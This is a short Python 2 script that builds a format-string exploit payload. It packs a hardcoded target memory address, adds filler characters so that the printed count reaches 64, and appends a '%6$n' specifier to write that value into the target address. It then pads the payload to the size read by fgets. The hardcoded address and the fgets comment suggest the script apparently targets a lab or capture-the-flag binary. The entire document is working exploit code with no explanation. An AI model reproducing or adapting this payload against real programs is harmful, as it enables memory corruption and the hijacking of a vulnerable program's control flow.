#!/usr/bin/python2.6

import struct

def pad(s, length=500):
    assert(len(s) <= length)
    return (s+"A"*length)[:length]

alignment_fix = ""
before_padding = "AAAA" + "AAAA"
target_address = struct.pack("P", 0x080496e4)
after_padding  = "BBBB" + "BBBB"

payload = alignment_fix + before_padding + target_address + after_padding

target_value = 64 # Value that we want to write
padding = target_value - len(payload)
payload = payload + "W"*padding + "%6$n" # 'W' == 0x57

payload = pad(
    payload,
    511 # Man page: fgets()  reads  in  at  most one less than size characters
)

print(payload)
